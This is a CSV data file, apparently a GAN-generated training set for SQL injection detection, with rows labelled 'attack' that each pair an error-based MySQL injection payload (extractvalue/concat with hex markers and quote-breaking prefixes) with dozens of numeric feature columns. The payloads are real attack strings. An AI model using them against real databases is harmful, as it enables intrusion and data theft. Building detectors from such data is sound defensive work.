id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000425,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.853053026924127,147.44557189941406,45.949283599853516,26.45289421081543,53.118408203125,1.0962836742401123,46.74359893798828,18.481321334838867,0.9966403245925903,0.30734512209892273,0.18871834874153137,0.37086230516433716,0.11604465544223785,3.7654950618743896,0.6108002066612244,0.5628467202186584,0.6622705459594727,0.1604061722755432,0.3446318209171295,-0.01875343546271324,4.797429084777832,5.207383155822754,3.1269516944885254,0.14547696709632874,1.038425087928772,0.09048651158809662,-0.002731842454522848,0.34070155024528503,0.20418024063110352,0.0014115202939137816,0.25573915243148804,0.01544693112373352,2.1043198108673096,-0.05227682366967201,0.4672211706638336,1.222132921218872,3.859668731689453,0.5527276396751404,1.0406169891357422,-0.08067250996828079,0.07540532946586609,0.4357623755931854,-0.0137077197432518,0.19225354492664337,-0.14176015555858612,-0.022076807916164398,-0.0008075088262557983,0.30509838461875916,0.20412656664848328,0.20279869437217712,0.19678807258605957,0.2141302525997162,-0.20198026299476624,0.14814555644989014,0.035810913890600204,0.0878344401717186,-0.01544235646724701,0.2455703616142273,-0.13834968209266663,0.19532863795757294,0.030609630048274994,-0.012213073670864105,-0.10690043866634369,0.18467487394809723,0.4769822657108307,-0.06939514726400375,0.6436842679977417,-0.11950796842575073,-0.02970774471759796,-0.13042092323303223,0.23348557949066162,-0.23399031162261963,-0.1369539201259613,-0.07438530027866364,0.016798952594399452,0.017761558294296265,0.7534561157226562,0.23950150609016418,0.09359543025493622,0.04030292108654976,-0.08374261111021042,4.954675674438477,0.27100732922554016,0.14353656768798828,0.16583378612995148,0.8216500282287598,-0.0650845319032669,-0.1773250550031662,-0.09118148684501648
GAN_000426,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,4.251241741763274,146.49070739746094,46.058448791503906,24.964332580566406,53.81174087524414,1.5311938524246216,50.12105178833008,18.93240737915039,0.7210773229598999,0.3141449987888336,0.17734163999557495,0.37016257643699646,0.1127387285232544,3.7850537300109863,0.5330331921577454,0.547123908996582,0.4928538203239441,0.004560376517474651,0.3142237663269043,-0.0411464124917984,5.019607067108154,5.252258777618408,3.490995168685913,0.40827107429504395,0.9907853603363037,0.07735280692577362,0.00614542979747057,0.13944554328918457,0.0018896833062171936,-0.002093884628266096,0.18601472675800323,0.14515087008476257,1.9651899337768555,-0.27809450030326843,0.4490647614002228,1.1274007558822632,3.8287672996520996,0.4489518702030182,1.0833278894424438,-0.0005743280053138733,0.1712317317724228,0.5296871066093445,-0.1134650930762291,0.19910652935504913,0.07379528880119324,-0.015384621918201447,0.04098522663116455,0.29303616285324097,0.19339263439178467,0.3147510290145874,0.17153052985668182,0.27189144492149353,-0.2212255597114563,0.05472903698682785,0.14887072145938873,-0.1506122648715973,-0.22734810411930084,0.05745027959346771,0.18179436028003693,0.4039703905582428,0.07955429702997208,0.35954749584198,-0.1541755050420761,-0.006008293479681015,0.48278263211250305,0.2710079550743103,0.44170942902565,0.19683991372585297,-0.1733495593070984,-0.22499960660934448,-0.09114182740449905,-0.16837351024150848,-0.12347028404474258,-0.31433436274528503,0.012125130742788315,0.0035886389669030905,0.6810265183448792,0.1816571205854416,0.2891027331352234,-0.013494630344212055,-0.19885864853858948,4.398956298828125,0.42644619941711426,0.16402462124824524,0.07347877323627472,0.8341522216796875,-0.09882727265357971,0.05805444344878197,0.3143497109413147
GAN_000427,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.763201129863562,148.01812744140625,46.8392333984375,27.620105743408203,54.0076789855957,1.3155837059020996,47.15664291381836,18.854806900024414,1.155381202697754,0.31525492668151855,0.18825553357601166,0.3696092367172241,0.11806583404541016,3.7650363445281982,0.8124653100967407,0.4871891438961029,0.6456581354141235,0.14155460894107819,0.31223952770233154,0.06573376804590225,4.91668176651001,5.262460708618164,3.8511440753936768,0.23036885261535645,1.1064902544021606,0.015791025012731552,-0.0313124805688858,0.2970125079154968,-0.10559887439012527,0.007127504330128431,0.1086743026971817,0.025203339755535126,2.108839511871338,0.01882655918598175,0.47904497385025024,1.2033703327178955,3.794991970062256,0.3188152313232422,1.0751668214797974,0.013598058372735977,0.12181497365236282,0.41845449805259705,-0.10581379383802414,0.1574617624282837,-0.09142164140939713,0.234844371676445,-0.16455988585948944,0.2686695158481598,0.21677616238594055,0.22168733179569244,0.11244283616542816,0.27689552307128906,-0.23316070437431335,-0.01147453859448433,0.14808082580566406,-0.07306481152772903,-0.16458161175251007,0.10047740489244461,0.1294175684452057,0.10402057319879532,0.09020110219717026,0.17914269864559174,-0.01879499852657318,0.07074210047721863,0.37260517477989197,0.06644845008850098,0.6059501767158508,-0.11212397366762161,-0.06256645172834396,-0.12839025259017944,0.037653230130672455,-0.11202095448970795,-0.18570932745933533,-0.11217045783996582,0.016622858121991158,0.014244728721678257,0.7256941795349121,0.24891389906406403,0.1707817018032074,-0.014066499657928944,-0.1173069104552269,4.8684983253479,0.3270978331565857,0.1726149320602417,0.11293882131576538,0.7787220478057861,-0.28756803274154663,0.16222520172595978,-0.01232638955116272
GAN_000428,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.731900722288835,147.33059692382812,47.6519660949707,25.85152816772461,53.44115447998047,0.12150220572948456,46.15791320800781,18.861534118652344,1.1090441942214966,0.30782550573349,0.18751777708530426,0.3696051239967346,0.11584339290857315,3.7643167972564697,0.8824506998062134,0.47362664341926575,0.6687114834785461,0.08552391827106476,0.29097050428390503,-0.09345772117376328,4.989977836608887,5.201945781707764,3.5917041301727295,0.052264124155044556,0.9868326187133789,-0.026512034237384796,-0.07875245064496994,0.16206522285938263,-0.0057551865465939045,0.0021694465540349483,0.12328308820724487,0.06137452274560928,2.3218913078308105,0.06936322152614594,0.5431212186813354,1.0779985189437866,3.8893721103668213,0.6062078475952148,1.1520575284957886,-0.012411430478096008,0.11278709769248962,0.33770057559013367,0.02772418037056923,0.19781537353992462,-0.14492088556289673,-0.0002133399248123169,0.032202884554862976,0.23183780908584595,0.26444360613822937,0.24453255534172058,0.08544468879699707,0.17621858417987823,-0.06815677881240845,-0.11893019825220108,-0.011391415260732174,-0.07324608415365219,0.02538948878645897,-0.07852423191070557,0.014715582132339478,0.3405311107635498,-0.1476469337940216,0.09953948855400085,0.09979938715696335,0.09832096099853516,0.43835949897766113,0.012764103710651398,0.6566358208656311,-0.15446656942367554,-0.029408015310764313,-0.1326763927936554,0.1570912003517151,-0.16431646049022675,0.039759561419487,-0.02603548765182495,0.015881625935435295,0.001814883085899055,0.6997920870780945,0.2905578911304474,-0.018585793673992157,0.021023401990532875,-0.051481179893016815,4.654287338256836,0.3619869649410248,0.11270508170127869,0.15726830065250397,0.8655509948730469,0.07532137632369995,-0.14002786576747894,0.12962937355041504
GAN_000429,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7391543879780627,147.81591796875,45.538169860839844,26.396648406982422,53.09069061279297,1.3216465711593628,47.17467498779297,18.945215225219727,1.117060899734497,0.3049420416355133,0.1929698884487152,0.36954760551452637,0.11882597208023071,3.7798922061920166,0.6548975110054016,0.4876577854156494,0.5696276426315308,0.15873658657073975,0.3111272156238556,-0.12846693396568298,4.882096767425537,5.061070442199707,3.033202886581421,0.17530904710292816,1.1591310501098633,0.08135879039764404,0.01795351505279541,0.2620829641819,-0.0250070933252573,0.012711224146187305,0.26825690269470215,-0.00042344629764556885,2.0331926345825195,0.013934760354459286,0.444381445646286,1.2037110328674316,3.8448050022125244,0.2913285493850708,1.097813367843628,-0.01864941418170929,0.10430532693862915,0.4291398525238037,0.03789421543478966,0.16523565351963043,-0.07630481570959091,0.08027501404285431,-0.09899942576885223,0.2000299096107483,0.18958091735839844,0.2032298743724823,0.13487130403518677,0.29239386320114136,-0.24684566259384155,0.05277319252490997,0.05282812565565109,-0.037888117134571075,-0.1552896648645401,0.10805179923772812,-0.016881145536899567,0.1281176656484604,-0.0030581876635551453,0.16977337002754211,0.012481868267059326,0.08791780471801758,0.4063376784324646,0.014203011989593506,0.6299288868904114,-0.03640000522136688,-0.12239091843366623,-0.13068652153015137,0.14256945252418518,-0.09534110128879547,-0.06956879794597626,-0.07185275852680206,0.01634654402732849,0.023942628875374794,0.6643907427787781,0.20515640079975128,0.06451695412397385,0.03491581231355667,0.020270276814699173,5.347066879272461,0.3294336199760437,0.12697455286979675,0.1809924840927124,0.8158701062202454,-0.16456817090511322,0.11524799466133118,-0.028125762939453125
GAN_000430,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.988625932464048,145.652587890625,43.96205520629883,25.693145751953125,52.95644760131836,-0.43424469232559204,50.029911041259766,20.52821922302246,0.6578359603881836,0.28296563029289246,0.20512983202934265,0.36600935459136963,0.11691480129957199,3.807530641555786,1.0588459968566895,0.17483113706111908,0.49222514033317566,0.16087643802165985,0.32565709948539734,0.26610058546066284,4.9079155921936035,5.269721508026123,3.7553911209106445,0.022142261266708374,0.8862770795822144,0.0736045390367508,-0.3421192765235901,0.13203153014183044,0.020077569410204887,0.017786748707294464,0.25034448504447937,-0.2944169044494629,2.4520821571350098,0.07080517709255219,0.4699775278568268,1.1572004556655884,3.8784677982330322,0.35306620597839355,1.0202919244766235,-0.013350948691368103,0.14360764622688293,0.3822338581085205,0.1539234220981598,0.1755073070526123,0.05384798347949982,0.2524378001689911,0.4348900318145752,0.18868733942508698,0.2715846002101898,0.35139399766921997,0.0940416157245636,0.2381870448589325,0.238169327378273,-0.4383206069469452,-0.21403951942920685,0.005934454500675201,-0.14329443871974945,0.22363686561584473,-0.2940236032009125,0.3131807744503021,0.00945793092250824,0.17310552299022675,0.05390765517950058,0.32143697142601013,0.3549692928791046,0.1609545648097992,0.440864622592926,0.005524151027202606,-0.10104354470968246,-0.1452784538269043,-0.1502041220664978,-0.16243939101696014,-0.0036789551377296448,-0.007319211959838867,-0.008296935819089413,0.0034416408743709326,0.9053435921669006,0.12112725526094437,-0.04208710789680481,0.053195033222436905,0.07011443376541138,5.0967631340026855,0.48505309224128723,0.18737933039665222,0.06792379915714264,0.8973290920257568,0.06696298718452454,0.28380855917930603,0.21660783886909485
GAN_000431,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.963696263949873,147.3626251220703,45.14775848388672,26.391674041748047,53.84951400756836,1.3329182863235474,48.729156494140625,18.55624771118164,0.8287693858146667,0.3139512538909912,0.1930692344903946,0.37015923857688904,0.11494869738817215,3.787743091583252,0.6676135659217834,0.4211938977241516,0.567966878414154,0.11821319162845612,0.3109900653362274,0.03031761199235916,4.893681049346924,5.282552242279053,3.1853444576263428,0.11882547289133072,1.0901048183441162,0.06952852010726929,-0.061164695769548416,0.32340115308761597,0.192408949136734,-0.0006957948789931834,0.24221539497375488,-0.08471313118934631,2.0908830165863037,-0.08956454694271088,0.4462929666042328,1.2120298147201538,3.820150136947632,0.6626936197280884,1.0153778791427612,0.03177834674715996,0.10233002156019211,0.4567001163959503,-0.022927038371562958,0.23268038034439087,-0.009854331612586975,0.039274051785469055,0.09192466735839844,0.2860508859157562,0.2447519153356552,0.28253623843193054,0.24256402254104614,0.22547487914562225,-0.06957639753818512,-0.05802503600716591,0.009932849556207657,0.11681810766458511,-0.19075262546539307,0.1444261074066162,-0.1638510823249817,0.26526498794555664,0.04208461195230484,0.12389744818210602,0.013369672000408173,0.0828431248664856,0.4332481622695923,0.07277295738458633,0.5551217794418335,0.053493648767471313,-0.13424378633499146,-0.13752973079681396,0.11920669674873352,-0.12377561628818512,0.0019670911133289337,-0.1881578266620636,0.0015716453781351447,0.00644015334546566,0.6896743178367615,0.22900545597076416,0.12560082972049713,0.04257795214653015,-0.1181783601641655,4.6856770515441895,0.3106047511100769,0.19969001412391663,0.14928393065929413,0.8038128018379211,-0.07662607729434967,-0.12057679891586304,0.014708608388900757
GAN_000432,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.763031324958297,147.86402893066406,46.356327056884766,26.29104995727539,53.94260025024414,1.1678333282470703,47.06242370605469,18.424026489257812,0.9400931596755981,0.30940744280815125,0.1856415718793869,0.3705193102359772,0.11599765717983246,3.764145851135254,0.6889048218727112,0.4697040319442749,0.5949593782424927,0.13171641528606415,0.27196645736694336,-0.058825477957725525,4.720660209655762,5.272156238555908,3.1601617336273193,0.1379810869693756,1.110029935836792,0.02165466547012329,-0.14416873455047607,0.2570652663707733,0.08366556465625763,0.0019650179892778397,0.16357070207595825,-0.001695983111858368,2.1149041652679443,-0.03258717805147171,0.4830024242401123,1.1272975206375122,3.853591203689575,0.6051303744316101,1.0434353351593018,0.026463892310857773,0.062420450150966644,0.45846644043922424,-0.010630138218402863,0.22604992985725403,-0.1203492283821106,0.008708164095878601,0.03294023871421814,0.2359306961297989,0.1916010081768036,0.20068541169166565,0.1939060539007187,0.21197494864463806,-0.1030198186635971,-0.025496233254671097,0.035448528826236725,0.057547301054000854,-0.14870662987232208,0.07181038707494736,-0.06324881315231323,0.19306588172912598,-0.05065566301345825,-0.007595393806695938,0.03905872255563736,0.12775541841983795,0.4200335144996643,-0.00658683106303215,0.6664049029350281,-0.06009957194328308,-0.05648688226938248,-0.09427345544099808,0.17624956369400024,-0.15050584077835083,-0.028492406010627747,0.009046800434589386,0.005503174848854542,0.015368664637207985,0.7273728847503662,0.27013611793518066,0.05227643623948097,0.04031091928482056,0.0230715312063694,4.794622421264648,0.29681968688964844,0.11691341549158096,0.1765563040971756,0.7673171758651733,-0.0641133189201355,-0.1793002188205719,-0.05860573425889015
GAN_000433,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.748751667747331,149.5762939453125,46.19038009643555,26.330366134643555,54.44591522216797,0.1889372318983078,46.68136978149414,18.684911727905273,0.8584233522415161,0.30479124188423157,0.1887463629245758,0.3679383099079132,0.1195538192987442,3.772252082824707,0.9372094869613647,0.6754032969474792,0.6619842052459717,0.11676120012998581,0.3327590823173523,0.05734563618898392,4.81370210647583,5.275784015655518,3.6865639686584473,0.03647170960903168,1.0978329181671143,0.039421480149030685,-0.07296498864889145,0.16439267992973328,0.038191892206668854,0.019716259092092514,0.10997507721185684,-0.04666442796587944,2.2143948078155518,-0.018407460302114487,0.47868314385414124,1.1004695892333984,3.899641275405884,0.4808530807495117,1.0891380310058594,-0.04701465740799904,0.06754279136657715,0.4640520215034485,-0.061519138514995575,0.22213001549243927,-0.05869484692811966,0.11547733098268509,0.0676397830247879,0.21911399066448212,0.2066033035516739,0.25655221939086914,0.12255798280239105,0.30384907126426697,0.06209443509578705,-0.008628211915493011,-0.10096722096204758,0.0248161181807518,-0.0049874447286129,0.1012197807431221,0.005254566669464111,0.14884009957313538,-0.02704750746488571,0.018268026411533356,-0.033981889486312866,0.04588403180241585,0.3312065899372101,-0.06602691113948822,0.5957897901535034,0.08760811388492584,-0.019314870238304138,0.11711117625236511,0.029341649264097214,-0.0930950939655304,-0.06989920139312744,0.023693032562732697,0.018841031938791275,0.0072083184495568275,0.7997297644615173,0.24995620548725128,0.03178025782108307,0.004840950947254896,0.08528811484575272,5.18545389175415,0.3649209141731262,0.10957956314086914,0.17284876108169556,0.7833234667778015,-0.04232877120375633,0.1342652142047882,0.018233001232147217
GAN_000434,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,3.9677559067353205,147.39004516601562,45.69244384765625,26.91583824157715,54.61948776245117,1.5765732526779175,48.17359161376953,18.32170867919922,0.7837212681770325,0.3028242886066437,0.18142908811569214,0.3708953559398651,0.11436018347740173,3.7595627307891846,0.6080042719841003,0.6882017254829407,0.7770439386367798,0.1432753950357437,0.32362088561058044,-0.1093742772936821,4.833047389984131,5.4214277267456055,3.335296630859375,0.18469706177711487,1.0595917701721191,0.20978020131587982,-0.023809105157852173,0.20698091387748718,0.25041210651397705,0.008681455627083778,0.1920417845249176,0.05516204982995987,2.1979095935821533,-0.1896732896566391,0.475117564201355,1.1726247072219849,3.863001585006714,0.5928664207458496,1.0337706804275513,-0.12020988017320633,0.10728251188993454,0.4387572407722473,-0.12056923657655716,0.23962420225143433,-0.025172241032123566,-0.061099566519260406,0.06472763419151306,0.25138553977012634,0.23081639409065247,0.2830924987792969,0.19498056173324585,0.24674001336097717,0.037659406661987305,0.1559056043624878,0.04629701375961304,0.18384429812431335,-0.16367276012897491,0.16423627734184265,-0.035226546227931976,0.06195283308625221,0.14330774545669556,0.1352444589138031,-0.0547633022069931,0.018395960330963135,0.419824481010437,-0.0511288195848465,0.5716539621353149,0.06026667356491089,-0.03499226272106171,0.041276440024375916,0.007639098912477493,-0.10412605851888657,-0.14335522055625916,-0.09540605545043945,0.016961170360445976,0.008142576552927494,0.7886861562728882,0.24886520206928253,0.2659755349159241,-0.009376482106745243,-0.11026418954133987,4.864739894866943,0.31355810165405273,0.14468033611774445,0.1533011943101883,0.7655268311500549,-0.02811431884765625,-0.06700964272022247,0.1710796356201172
GAN_000435,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.6822198425328114,147.2659454345703,46.605289459228516,25.115570068359375,53.948158264160156,0.24191848933696747,46.794105529785156,18.934616088867188,1.113200306892395,0.31556016206741333,0.18878723680973053,0.36734843254089355,0.1178971379995346,3.761147975921631,0.8889449834823608,0.47991275787353516,0.6123886704444885,0.1107693687081337,0.2595946192741394,0.062338851392269135,4.8485493659973145,5.183295726776123,3.448739767074585,0.1737033575773239,1.06333589553833,-0.08965542912483215,-0.08097899705171585,0.20648203790187836,-0.0631304457783699,0.0023666429333388805,0.19255180656909943,0.14797720313072205,2.2195260524749756,0.14502814412117004,0.5321915149688721,1.0249868631362915,3.7765862941741943,0.4378936290740967,1.0604783296585083,0.1242423951625824,0.05848286673426628,0.42250385880470276,-0.027397796511650085,0.21257050335407257,-0.15871697664260864,0.0647459551692009,-0.07373479008674622,0.222586527466774,0.14673735201358795,0.18368560075759888,0.10702857375144958,0.2553778290748596,-0.1711796522140503,-0.10931237041950226,-0.03763251751661301,-0.12776058912277222,-0.12380687892436981,-0.07175058871507645,0.15004242956638336,0.19293807446956635,-0.18177641928195953,0.1510629951953888,0.16219359636306763,0.05351774021983147,0.3917205333709717,-0.04393031448125839,0.6380835175514221,-0.05756000801920891,-0.04686674475669861,-0.11482561379671097,0.18345510959625244,-0.08420920372009277,-0.05188681185245514,0.10178600251674652,0.015749851241707802,0.013532531447708607,0.7006409168243408,0.26501357555389404,-0.017385676503181458,0.008793975226581097,-0.04518333822488785,4.799469470977783,0.3468019366264343,0.13939836621284485,0.10684772580862045,0.792509913444519,-0.11131618916988373,0.05961794778704643,-0.03957411274313927
GAN_000436,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,3.8415774787791688,147.82464599609375,46.05720520019531,26.8745174407959,54.0536003112793,0.8673566579818726,47.58434295654297,18.528507232666016,0.9860177040100098,0.30680960416793823,0.1808193475008011,0.37059736251831055,0.11688661575317383,3.7622931003570557,0.776312530040741,0.7434876561164856,0.7069021463394165,0.13521352410316467,0.2821252942085266,-0.20080330967903137,4.845251560211182,5.209635257720947,3.2505085468292236,0.16396859288215637,1.1384848356246948,0.022462718188762665,0.024102095514535904,0.20764848589897156,-0.038491636514663696,0.009605120867490768,0.24894532561302185,0.1401376724243164,2.1005146503448486,-0.052068743854761124,0.5039792656898499,1.1968986988067627,3.8385705947875977,0.39833617210388184,1.093808889389038,-0.06480179727077484,0.10789355635643005,0.43610674142837524,-0.09865763038396835,0.1833174228668213,-0.060842521488666534,0.10985724627971649,-0.13936640322208405,0.17218627035617828,0.17777381837368011,0.24322053790092468,0.1240026205778122,0.3341115415096283,-0.15842007100582123,0.14409396052360535,0.06480612605810165,0.12693734467029572,-0.11277197301387787,0.20808929204940796,0.028989776968955994,0.12601570785045624,0.08946102112531662,0.28842151165008545,-0.022011473774909973,0.08310548961162567,0.38548746705055237,-0.0033527277410030365,0.6545165777206421,-0.03434278070926666,-0.09004107117652893,-0.05361836403608322,0.09992179274559021,-0.08026852458715439,-0.05952131003141403,0.0477742925286293,0.011855955235660076,0.017387153580784798,0.7163248658180237,0.24478447437286377,0.15676836669445038,-0.01581661030650139,-0.08308804780244827,5.304286003112793,0.3376465141773224,0.12457945942878723,0.16182838380336761,0.7861541509628296,-0.10531209409236908,0.147732675075531,0.06656483560800552
GAN_000437,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7760105071033077,148.38861083984375,47.255157470703125,25.43669319152832,53.259788513183594,1.006912350654602,46.24082565307617,18.756637573242188,1.13007652759552,0.3032660484313965,0.18164770305156708,0.37077251076698303,0.11758866906166077,3.777010202407837,0.7836730480194092,0.5971721410751343,0.7336869239807129,0.08113735169172287,0.33481645584106445,-0.11414030939340591,4.956056118011475,5.081387519836426,3.349362850189209,0.13682997226715088,1.0266835689544678,0.014215901494026184,0.10979604721069336,0.20722460746765137,0.008915655314922333,0.006765705067664385,0.13952244818210602,0.10752139240503311,2.054448366165161,0.04806032031774521,0.4628591537475586,1.0424184799194336,3.8011696338653564,0.3736807703971863,1.084973692893982,0.013592135161161423,0.11453107744455338,0.44594553112983704,0.08673164993524551,0.16906489431858063,-0.12926645576953888,0.08147022128105164,-0.08179379999637604,0.267802894115448,0.19398628175258636,0.21706120669841766,0.12221837043762207,0.3022684156894684,-0.12241102755069733,0.020915403962135315,-0.015821216627955437,-0.06906604021787643,-0.039885278791189194,0.09554212540388107,0.02567237615585327,0.20814621448516846,-0.11406632512807846,0.07512593269348145,-0.08892329037189484,0.04482847824692726,0.4502754211425781,-0.01030498743057251,0.6153910756111145,-0.11462581902742386,-0.04074081778526306,-0.13133510947227478,0.13730809092521667,-0.16832824051380157,-0.09924984723329544,-0.08129940927028656,0.019634567201137543,0.016452666372060776,0.6329120397567749,0.1663074940443039,0.11454533040523529,0.014902579598128796,-0.061309583485126495,4.769469738006592,0.33833980560302734,0.054074473679065704,0.11770451068878174,0.892663836479187,0.03666825219988823,-0.024028073996305466,-0.061167288571596146
GAN_000438,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7175672441921255,147.80274963378906,46.13312530517578,27.314725875854492,53.25479507446289,0.9880815148353577,47.425785064697266,18.81744956970215,1.0816693305969238,0.30244743824005127,0.18690642714500427,0.3668781816959381,0.11706341058015823,3.7592670917510986,0.7082510590553284,0.4426937401294708,0.6533191800117493,0.12500251829624176,0.23493614792823792,-0.06909368932247162,4.861584186553955,5.22197151184082,3.3212411403656006,0.1434597223997116,1.0777145624160767,0.03930770978331566,-0.035113707184791565,0.2993437945842743,-0.07746486365795135,0.0036737273912876844,0.13745573163032532,0.011636205017566681,2.1641056537628174,0.04252702742815018,0.464809387922287,1.2179462909698486,3.8660831451416016,0.4251598119735718,1.024990200996399,-0.008960437029600143,0.10017785429954529,0.5239965915679932,0.10967753827571869,0.16822706162929535,0.056720882654190063,0.1181163564324379,-0.03666268289089203,0.23558510839939117,0.20504283905029297,0.21587739884853363,0.12341158092021942,0.25745370984077454,-0.12036660313606262,0.025642581284046173,0.032758042216300964,0.041630275547504425,0.05219554528594017,0.1516081988811493,-0.09982140362262726,0.32499879598617554,-0.0185215026140213,0.03382483869791031,-0.00314195454120636,0.102643683552742,0.45269328355789185,0.02369929850101471,0.6564322113990784,-0.1772802323102951,-0.08610806614160538,-0.16180330514907837,0.15523387491703033,-0.13740397989749908,-0.1330544352531433,-0.07019782066345215,0.008184731006622314,0.018355408683419228,0.6985913515090942,0.2432282716035843,0.059740759432315826,0.0483698733150959,-0.047022901475429535,5.163970470428467,0.30294474959373474,0.2429502308368683,0.15582317113876343,0.7975322008132935,-0.17643296718597412,-0.08476594090461731,0.013675875961780548
